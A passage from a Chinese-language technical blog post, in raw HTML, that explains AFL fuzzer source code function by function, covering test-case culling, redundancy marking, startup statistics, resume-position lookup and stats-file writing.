class="comment">/* 重置分数变化标志 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 将temp_v初始化为全1，表示所有路径位置都需要被覆盖 */</span></span><br><span class="line">  <span class="built_in">memset</span>(temp_v, <span class="number">255</span>, MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 重置优选测试用例计数器 */</span></span><br><span class="line">  queued_favored = <span class="number">0</span>;    <span class="comment">/* 队列中被标记为优选的测试用例总数 */</span></span><br><span class="line">  pending_favored = <span class="number">0</span>;   <span class="comment">/* 尚未执行的优选测试用例数 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 第一轮遍历：清除所有测试用例的优选标记 */</span></span><br><span class="line">  q = <span class="built_in">queue</span>;</span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    q-&gt;favored = <span class="number">0</span>;</span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 核心算法：贪心选择能覆盖最多独特路径的测试用例 */</span></span><br><span class="line">  <span class="comment">/* 遍历覆盖位图中的每个位置 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line">    <span class="comment">/* 如果该位置有最高评分的测试用例，且该位置在temp_v中还未被覆盖 */</span></span><br><span class="line">    <span class="keyword">if</span> (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="number">3</span>] &amp; (<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>)))) &#123;</span><br><span class="line">      </span><br><span class="line">      u32 j = MAP_SIZE &gt;&gt; <span class="number">3</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 从temp_v中移除当前选中测试用例所覆盖的所有路径位 */</span></span><br><span class="line">      <span class="comment">/* trace_mini记录了该测试用例覆盖了哪些路径 */</span></span><br><span class="line">      <span class="keyword">while</span> (j--)</span><br><span class="line">        <span class="keyword">if</span> (top_rated[i]-&gt;trace_mini[j])<span class="comment">//快速筛</span></span><br><span class="line">          temp_v[j] &amp;= ~top_rated[i]-&gt;trace_mini[j];</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 标记该测试用例为优选 */</span></span><br><span class="line">      top_rated[i]-&gt;favored = <span class="number">1</span>;</span><br><span class="line">      queued_favored++;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 如果该测试用例还未被模糊测试过，增加待处理计数 */</span></span><br><span class="line">      <span class="keyword">if</span> (!top_rated[i]-&gt;was_fuzzed)</span><br><span class="line">        pending_favored++;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 第二轮遍历：根据是否被标记为优选来设置冗余标记 */</span></span><br><span class="line">  q = <span class="built_in">queue</span>;</span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    <span class="comment">/* 非优选的测试用例被标记为冗余 */</span></span><br><span class="line">    mark_as_redundant(q, !q-&gt;favored);</span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段函数我们重点关注temp_v这个位图，一开始<code> memset(temp_v, 255, MAP_SIZE &gt;&gt; 3);</code>该位图被全部位设置为1，<code>if (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; 3] &amp; (1 &lt;&lt; (i &amp; 7))))</code> 这里先判断是否这个边有最佳的样例，如果有再判断temp_v这一位是非被置为0，如果也没有被置为0则进行后面的步骤把该样例可以经过的所有路径都置为0吗，这里是一个贪心算法，如果后面即使还有边对应的优选样例，如果这个边已经被置位则不会再做这个工作。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (top_rated[i]-&gt;trace_mini[j])<span class="comment">//快速筛</span></span><br><span class="line">          temp_v[j] &amp;= ~top_rated[i]-&gt;trace_mini[j];</span><br></pre></td></tr></table></figure><p>这里有个小技巧和之前一样，先判断这个字节要不要置位，再对这个字节统一操作</p><p>然后会对所有被贪心算法选中的边设置为优选，优选计数也增加，如果该测试用例还未被模糊测试过，增加待处理计数，然后会对未被优选的用例设置为冗余。</p><p>非优选的测试用例被标记为冗余，具体的处理函数为mark_as_redundant</p><h3 id="mark-as-redundant"><a href="#mark-as-redundant" class="headerlink" title="mark_as_redundant"></a>mark_as_redundant</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mark_as_redundant</span><span class="params">(struct queue_entry *q, u8 state)</span> </span>&#123;</span><br><span class="line">  u8 *fn;    <span class="comment">/* 文件名指针 */</span></span><br><span class="line">  s32 fd;    <span class="comment">/* 文件描述符 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果冗余状态没有改变，直接返回，避免不必要的文件操作 */</span></span><br><span class="line">  <span class="keyword">if</span> (state == q-&gt;fs_redundant)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 更新队列项的冗余状态标志 */</span></span><br><span class="line">  q-&gt;fs_redundant = state;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 从完整路径中提取文件名部分（获取最后一个&#x27;/&#x27;之后的部分） */</span></span><br><span class="line">  fn = <span class="built_in">strrchr</span>((<span class="keyword">char</span> *)q-&gt;fname, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 构建冗余标记文件的完整路径 </span></span><br><span class="line"><span class="comment">   * 格式：输出目录/queue/.state/redundant_edges/测试用例文件名 </span></span><br><span class="line"><span class="comment">   * 这个文件用于持久化记录该测试用例的冗余状态 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/queue/.state/redundant_edges/%s&quot;</span>, out_dir, fn + <span class="number">1</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (state) &#123;</span><br><span class="line">    <span class="comment">/* 标记为冗余：创建一个空的标记文件 */</span></span><br><span class="line">    <span class="comment">/* O_WRONLY: 只写模式</span></span><br><span class="line"><span class="comment">     * O_CREAT: 如果文件不存在则创建</span></span><br><span class="line"><span class="comment">     * O_EXCL: 确保创建新文件，如果文件已存在则失败</span></span><br><span class="line"><span class="comment">     * 0600: 文件权限（仅所有者可读写） */</span></span><br><span class="line">    fd = open(fn, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);  <span class="comment">/* 创建失败，报致命错误 */</span></span><br><span class="line">    close(fd);  <span class="comment">/* 关闭文件描述符，我们只需要创建文件，不需要写入内容 */</span></span><br><span class="line">    </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 取消冗余标记：删除标记文件 */</span></span><br><span class="line">    <span class="keyword">if</span> (unlink(fn))</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to remove &#x27;%s&#x27;&quot;</span>, fn);  <span class="comment">/* 删除失败，报致命错误 */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 释放动态分配的文件名内存 */</span></span><br><span class="line">  ck_free(fn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数是用来设置和取消冗余路径的，如果添加就在.$OUT/queue/.state/redundant_edges路径里添加一个同名文件，反之则删除</p><p>接下来是show_init_stats函数</p><h2 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats"></a>show_init_stats</h2><p>这个函数主要是对样例的数据做一些比较，来给用户反馈，比如：执行时间，bitmap大小，测试用例长度，会根据执行速度调整havoc变异策略的除数，是否有无用的测试用例。</p><p>如下图：</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250922160344396.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 显示初始化阶段的统计信息 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">show_init_stats</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">q</span> =</span> <span class="built_in">queue</span>;  <span class="comment">// 指向测试用例队列的指针</span></span><br><span class="line">  u32 min_bits = <span class="number">0</span>, max_bits = <span class="number">0</span>; <span class="comment">// bitmap大小的最小值和最大值</span></span><br><span class="line">  u64 min_us = <span class="number">0</span>, max_us = <span class="number">0</span>;     <span class="comment">// 执行时间的最小值和最大值（微秒）</span></span><br><span class="line">  u64 avg_us = <span class="number">0</span>;                  <span class="comment">// 平均执行时间（微秒）</span></span><br><span class="line">  u32 max_len = <span class="number">0</span>;                 <span class="comment">// 最大测试用例长度</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 计算平均执行时间 */</span></span><br><span class="line">  <span class="keyword">if</span> (total_cal_cycles)</span><br><span class="line">    avg_us = total_cal_us / total_cal_cycles;<span class="comment">//计算每轮的平均时间</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 遍历整个测试用例队列，收集统计信息 */</span></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    <span class="comment">/* 更新最小执行时间 */</span></span><br><span class="line">    <span class="keyword">if</span> (!min_us || q-&gt;exec_us &lt; min_us)</span><br><span class="line">      min_us = q-&gt;exec_us;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 更新最大执行时间 */</span></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;exec_us &gt; max_us)</span><br><span class="line">      max_us = q-&gt;exec_us;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 更新最小bitmap大小 */</span></span><br><span class="line">    <span class="keyword">if</span> (!min_bits || q-&gt;bitmap_size &lt; min_bits)</span><br><span class="line">      min_bits = q-&gt;bitmap_size;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 更新最大bitmap大小 */</span></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;bitmap_size &gt; max_bits)</span><br><span class="line">      max_bits = q-&gt;bitmap_size;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 更新最大测试用例长度 */</span></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;len &gt; max_len)</span><br><span class="line">      max_len = q-&gt;len;</span><br><span class="line">    </span><br><span class="line">    q = q-&gt;next;  <span class="comment">// 移动到下一个队列元素</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SAYF(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果目标程序执行速度很慢，输出警告 </span></span><br><span class="line"><span class="comment">   * QEMU模式下阈值为50ms，普通模式下阈值为10ms */</span></span><br><span class="line">  <span class="keyword">if</span> (avg_us &gt; (qemu_mode ? <span class="number">50000</span> : <span class="number">10000</span>))</span><br><span class="line">    WARNF(cLRD <span class="string">&quot;The target binary is pretty slow! See %s/perf_tips.txt.&quot;</span>,</span><br><span class="line">          doc_path);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 根据执行速度调整havoc变异策略的除数</span></span><br><span class="line"><span class="comment">   * 执行速度越慢，havoc_div越大，变异次数越少 */</span></span><br><span class="line">  <span class="keyword">if</span> (avg_us &gt; <span class="number">50000</span>)</span><br><span class="line">    havoc_div = <span class="number">10</span>; <span class="comment">/* 0-19 次/秒   */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">20000</span>)</span><br><span class="line">    havoc_div = <span class="number">5</span>;  <span class="comment">/* 20-49 次/秒  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">10000</span>)</span><br><span class="line">    havoc_div = <span class="number">2</span>;  <span class="comment">/* 50-100 次/秒 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果不是从中断的会话恢复，进行额外检查 */</span></span><br><span class="line">  <span class="keyword">if</span> (!resuming_fuzz) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 检查测试用例大小 */</span></span><br><span class="line">    <span class="keyword">if</span> (max_len &gt; <span class="number">50</span> * <span class="number">1024</span>)</span><br><span class="line">      WARNF(cLRD <span class="string">&quot;Some test cases are huge (%s) - see %s/perf_tips.txt!&quot;</span>,</span><br><span class="line">            DMS(max_len), doc_path);  <span class="comment">// DMS: 格式化显示大小</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (max_len &gt; <span class="number">10</span> * <span class="number">1024</span>)</span><br><span class="line">      WARNF(<span class="string">&quot;Some test cases are big (%s) - see %s/perf_tips.txt.&quot;</span>,</span><br><span class="line">            DMS(max_len), doc_path);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查是否有无用的测试用例 */</span></span><br><span class="line">    <span class="keyword">if</span> (useless_at_start &amp;&amp; !in_bitmap)</span><br><span class="line">      WARNF(cLRD <span class="string">&quot;Some test cases look useless. Consider using a smaller set.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查输入文件数量 */</span></span><br><span class="line">    <span class="keyword">if</span> (queued_paths &gt; <span class="number">100</span>)</span><br><span class="line">      WARNF(cLRD <span class="string">&quot;You probably have far too many input files! Consider &quot;</span></span><br><span class="line">                 <span class="string">&quot;trimming down.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (queued_paths &gt; <span class="number">20</span>)</span><br><span class="line">      WARNF(<span class="string">&quot;You have lots of input files; try starting small.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 输出统计信息汇总 */</span></span><br><span class="line">  OKF(<span class="string">&quot;Here are some useful stats:\n\n&quot;</span></span><br><span class="line">      cGRA <span class="string">&quot;    Test case count : &quot;</span> cRST</span><br><span class="line">      <span class="string">&quot;%u favored, %u variable, %u total\n&quot;</span>     <span class="comment">// 优选/可变/总数</span></span><br><span class="line">      cGRA <span class="string">&quot;       Bitmap range : &quot;</span> cRST</span><br><span class="line">      <span class="string">&quot;%u to %u bits (average: %0.02f bits)\n&quot;</span>  <span class="comment">// bitmap范围</span></span><br><span class="line">      cGRA <span class="string">&quot;        Exec timing : &quot;</span> cRST </span><br><span class="line">      <span class="string">&quot;%s to %s us (average: %s us)\n&quot;</span>,         <span class="comment">// 执行时间范围</span></span><br><span class="line">      queued_favored, queued_variable, queued_paths, min_bits, max_bits,</span><br><span class="line">      ((<span class="keyword">double</span>)total_bitmap_size) /</span><br><span class="line">          (total_bitmap_entries ? total_bitmap_entries : <span class="number">1</span>),  <span class="comment">// 避免除0</span></span><br><span class="line">      DI(min_us), DI(max_us), DI(avg_us));  <span class="comment">// DI: 格式化显示整数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 自动计算执行超时时间（如果用户未指定） */</span></span><br><span class="line">  <span class="keyword">if</span> (!timeout_given) &#123;</span><br><span class="line">    <span class="comment">/* 基本思路：5倍平均时间或1倍最大时间，取较大者</span></span><br><span class="line"><span class="comment">       然后向上舍入到EXEC_TM_ROUND毫秒，最大不超过1秒</span></span><br><span class="line"><span class="comment">       </span></span><br><span class="line"><span class="comment">       对于慢速程序，降低倍数（2x或3x），因为：</span></span><br><span class="line"><span class="comment">       1. 随机调度抖动影响较小</span></span><br><span class="line"><span class="comment">       2. 需要加快测试速度 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (avg_us &gt; <span class="number">50000</span>)</span><br><span class="line">      exec_tmout = avg_us * <span class="number">2</span> / <span class="number">1000</span>;    <span class="comment">// 很慢：2倍平均时间</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">10000</span>)</span><br><span class="line">      exec_tmout = avg_us * <span class="number">3</span> / <span class="number">1000</span>;    <span class="comment">// 较慢：3倍平均时间</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      exec_tmout = avg_us * <span class="number">5</span> / <span class="number">1000</span>;    <span class="comment">// 正常：5倍平均时间</span></span><br><span class="line"></span><br><span class="line">    exec_tmout = MAX(exec_tmout, max_us / <span class="number">1000</span>);  <span class="comment">// 至少要大于最大执行时间</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 向上舍入到EXEC_TM_ROUND的倍数 */</span></span><br><span class="line">    exec_tmout = (exec_tmout + EXEC_TM_ROUND) / EXEC_TM_ROUND * EXEC_TM_ROUND;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置上限 */</span></span><br><span class="line">    <span class="keyword">if</span> (exec_tmout &gt; EXEC_TIMEOUT)</span><br><span class="line">      exec_tmout = EXEC_TIMEOUT;</span><br><span class="line"></span><br><span class="line">    ACTF(<span class="string">&quot;No -t option specified, so I&#x27;ll use exec timeout of %u ms.&quot;</span>,</span><br><span class="line">         exec_tmout);</span><br><span class="line">    timeout_given = <span class="number">1</span>;  <span class="comment">// 标记超时已设置</span></span><br><span class="line">    </span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (timeout_given == <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="comment">/* 从恢复的会话中使用之前的超时设置 */</span></span><br><span class="line">    ACTF(<span class="string">&quot;Applying timeout settings from resumed session (%u ms).&quot;</span>, exec_tmout);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 在dumb模式下，重新运行超时的测试用例代价很高</span></span><br><span class="line"><span class="comment">     所以选择更保守的挂起超时时间 */</span></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode &amp;&amp; !getenv(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>))</span><br><span class="line">    hang_tmout = MIN(EXEC_TIMEOUT, exec_tmout * <span class="number">2</span> + <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  OKF(<span class="string">&quot;All set and ready to roll!&quot;</span>);  <span class="comment">// 一切就绪，准备开始fuzzing</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是find_start_position函数，</p><h2 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position"></a>find_start_position</h2><p><strong>功能总结：</strong> 这个函数是模糊测试器恢复功能的一部分。当模糊测试被中断后需要恢复时，它会：</p><ol><li>读取之前保存的状态文件（fuzzer_stats）</li><li>从文件中提取上次停止时的测试用例位置（cur_path字段）</li><li>返回这个位置，让模糊测试可以从中断的地方继续，而不是从头开始</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查找模糊测试的起始位置</span></span><br><span class="line"><span class="comment"> * 该函数用于从上次中断的位置恢复模糊测试</span></span><br><span class="line"><span class="comment"> * 返回值：返回要恢复的队列位置索引，如果不需要恢复则返回0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">find_start_position</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 临时缓冲区，用于读取状态文件内容 */</span></span><br><span class="line">  <span class="keyword">static</span> u8 tmp[<span class="number">4096</span>]; <span class="comment">/* Ought to be enough for anybody. */</span></span><br><span class="line">  </span><br><span class="line">  u8 *fn, *off;  <span class="comment">/* fn: 文件名指针; off: 偏移位置指针 */</span></span><br><span class="line">  s32 fd, i;     <span class="comment">/* fd: 文件描述符; i: 读取的字节数 */</span></span><br><span class="line">  u32 ret;       <span class="comment">/* 返回值，保存解析出的路径位置 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果不是在恢复模糊测试模式，直接返回0（从头开始） */</span></span><br><span class="line">  <span class="keyword">if</span> (!resuming_fuzz)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 根据是否是原地恢复来确定状态文件的路径 */</span></span><br><span class="line">  <span class="keyword">if</span> (in_place_resume)</span><br><span class="line">    <span class="comment">/* 原地恢复：状态文件在输出目录中 */</span></span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/fuzzer_stats&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* 非原地恢复：状态文件在输入目录的父目录中 */</span></span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/../fuzzer_stats&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 打开状态文件（只读模式） */</span></span><br><span class="line">  fd = open(fn, O_RDONLY);</span><br><span class="line">  ck_free(fn);  <span class="comment">/* 释放文件名内存 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果文件打开失败，返回0（从头开始） */</span></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 读取文件内容到临时缓冲区，最多读取4095字节（留一个字节给&#x27;\0&#x27;） */</span></span><br><span class="line">  i = read(fd, tmp, <span class="keyword">sizeof</span>(tmp) - <span class="number">1</span>);</span><br><span class="line">  (<span class="keyword">void</span>)i; <span class="comment">/* 忽略返回值，避免编译器警告 */</span></span><br><span class="line">  </span><br><span class="line">  close(fd);  <span class="comment">/* 关闭文件 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 在缓冲区中查找&quot;cur_path&quot;字段 </span></span><br><span class="line"><span class="comment">   * 这个字段记录了上次模糊测试停止时正在处理的测试用例索引 */</span></span><br><span class="line">  off = <span class="built_in">strstr</span>((<span class="keyword">char</span> *)tmp, <span class="string">&quot;cur_path          : &quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果没找到该字段，返回0（从头开始） */</span></span><br><span class="line">  <span class="keyword">if</span> (!off)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 解析出数字值（跳过&quot;cur_path          : &quot;这20个字符） */</span></span><br><span class="line">  ret = atoi(off + <span class="number">20</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 安全检查：如果解析出的值大于等于队列中的路径数，重置为0 */</span></span><br><span class="line">  <span class="keyword">if</span> (ret &gt;= queued_paths)</span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;  <span class="comment">/* 返回恢复位置 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="write-stats-file"><a href="#write-stats-file" class="headerlink" title="write_stats_file"></a>write_stats_file</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write_stats_file</span><span class="params">(<span class="keyword">double</span> bitmap_cvg, <span class="keyword">double</span> stability, <span class="keyword">double</span> eps)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 静态变量用于保存上次的值，以防在某些上下文中调用时无法获取实时统计 */</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">double</span> last_bcvg, last_stab, last_eps;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 用于获取资源使用情况的结构体（如内存使用） */</span></span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">rusage</span> <span class="title">usage</span>;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 构造输出文件路径：out_dir/fuzzer_stats */</span></span><br><span class="line">  u8 *fn = alloc_printf(<span class="string">&quot;%s/fuzzer_stats&quot;</span>, out_dir);</span><br><span class="line">  </span><br><span class="line">  s32 fd;    <span class="comment">// 文件描述符</span></span><br><span class="line">  FILE *f;   <span class="comment">// 文件指针</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建或截断文件，权限设置为 0600（仅所有者可读写） */</span></span><br><span class="line">  fd = open(fn, O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0600</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);  <span class="comment">// 创建失败则报错退出</span></span><br><span class="line">  </span><br><span class="line">  ck_free(fn);  <span class="comment">// 释放文件名内存</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 将文件描述符转换为 FILE* 指针，便于使用 fprintf */</span></span><br><span class="line">  f = fdopen(fd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!f)</span><br><span class="line">    PFATAL(<span class="string">&quot;fdopen() failed&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 保持最后的值，以防我们从另一个上下文调用</span></span><br><span class="line"><span class="comment">     在那里 exec/sec 统计等信息不易获得 */</span></span><br><span class="line">  <span class="keyword">if</span> (!bitmap_cvg &amp;&amp; !stability &amp;&amp; !eps) &#123;</span><br><span class="line">    <span class="comment">/* 如果所有参数都是 0，则使用上次保存的值 */</span></span><br><span class="line">    bitmap_cvg = last_bcvg;</span><br><span class="line">    stability = last_stab;</span><br><span class="line">    eps = last_eps;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 否则保存当前值供下次使用 */</span></span><br><span class="line">    last_bcvg = bitmap_cvg;</span><br><span class="line">    last_stab = stability;</span><br><span class="line">    last_eps = eps;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 写入所有统计信息到文件 */</span></span><br><span class="line">  <span class="built_in">fprintf</span>(f,</span><br><span class="line">          <span class="string">&quot;start_time        : %llu\n&quot;</span>       <span class="comment">// 开始时间（毫秒）</span></span><br><span class="line">          <span class="string">&quot;last_update       : %llu\n&quot;</span>       <span class="comment">// 最后更新时间（毫秒）</span></span><br><span class="line">          <span class="string">&quot;fuzzer_pid        : %u\n&quot;</span>         <span class="comment">// 模糊测试器进程 ID</span></span><br><span class="line">          <span class="string">&quot;cycles_done       : %llu\n&quot;</span>       <span class="comment">// 完成的循环数</span></span><br><span class="line">          <span class="string">&quot;execs_done        : %llu\n&quot;</span>       <span class="comment">// 完成的执行次数</span></span><br><span class="line">          <span class="string">&quot;execs_per_sec     : %0.02f\n&quot;</span>     <span class="comment">// 每秒执行次数</span></span><br><span class="line">          <span class="string">&quot;paths_total       : %u\n&quot;</span>         <span class="comment">// 总路径数</span></span><br><span class="line">          <span class="string">&quot;paths_favored     : %u\n&quot;</span>         <span class="comment">// 优先路径数</span></span><br><span class="line">          <span class="string">&quot;paths_found       : %u\n&quot;</span>         <span class="comment">// 发现的路径数</span></span><br><span class="line">          <span class="string">&quot;paths_imported    : %u\n&quot;</span>         <span class="comment">// 导入的路径数</span></span><br><span class="line">          <span class="string">&quot;max_depth         : %u\n&quot;</span>         <span class="comment">// 最大深度</span></span><br><span class="line">          <span class="string">&quot;cur_path          : %u\n&quot;</span>         <span class="comment">// 当前路径 /* 必须匹配 find_start_position() */</span></span><br><span class="line">          <span class="string">&quot;pending_favs      : %u\n&quot;</span>         <span class="comment">// 待处理的优先路径</span></span><br><span class="line">          <span class="string">&quot;pending_total     : %u\n&quot;</span>         <span class="comment">// 待处理的总数</span></span><br><span class="line">          <span class="string">&quot;variable_paths    : %u\n&quot;</span>         <span class="comment">// 可变路径数</span></span><br><span class="line">          <span class="string">&quot;stability         : %0.02f%%\n&quot;</span>   <span class="comment">// 稳定性百分比</span></span><br><span class="line">          <span class="string">&quot;bitmap_cvg        : %0.02f%%\n&quot;</span>   <span class="comment">// 位图覆盖率百分比</span></span><br><span class="line">          <span class="string">&quot;unique_crashes    : %llu\n&quot;</span>       <span class="comment">// 唯一崩溃数</span></span><br><span class="line">          <span class="string">&quot;unique_hangs      : %llu\n&quot;</span>       <span class="comment">// 唯一挂起数</span></span><br><span class="line">          <span class="string">&quot;last_path         : %llu\n&quot;</span>       <span class="comment">// 最后发现路径的时间</span></span><br><span class="line">          <span class="string">&quot;last_crash        : %llu\n&quot;</span>       <span class="comment">// 最后崩溃时间</span></span><br><span class="line">          <span class="string">&quot;last_hang         : %llu\n&quot;</span>       <span class="comment">// 最后挂起时间</span></span><br><span class="line">          <span class="string">&quot;execs_since_crash : %llu\n&quot;</span>       <span class="comment">// 自上次崩溃以来的执行次数</span></span><br><span class="line">          <span class="string">&quot;exec_timeout      : %u\n&quot;</span>         <span class="comment">// 执行超时时间 /* 必须匹配 find_timeout() */</span></span><br><span class="line">          <span class="string">&quot;afl_banner        : %s\n&quot;</span>         <span class="comment">// AFL 横幅信息</span></span><br><span class="line">          <span class="string">&quot;afl_version       : &quot;</span> VERSION <span class="string">&quot;\n&quot;</span> <span class="comment">// AFL 版本</span></span><br><span class="line">          <span class="string">&quot;target_mode       : %s%s%s%s%s%s%s\n&quot;</span> <span class="comment">// 目标模式（多个标志的组合）</span></span><br><span class="line">          <span class="string">&quot;command_line      : %s\n&quot;</span>         <span class="comment">// 命令行</span></span><br><span class="line">          <span class="string">&quot;slowest_exec_ms   : %llu\n&quot;</span>,      <span class="comment">// 最慢执行时间（毫秒）</span></span><br><span class="line">          </span><br><span class="line">          <span class="comment">/* 实际参数值 */</span></span><br><span class="line">          start_time / <span class="number">1000</span>, get_cur_time() / <span class="number">1000</span>, getpid(),</span><br><span class="line">          queue_cycle ? (queue_cycle - <span 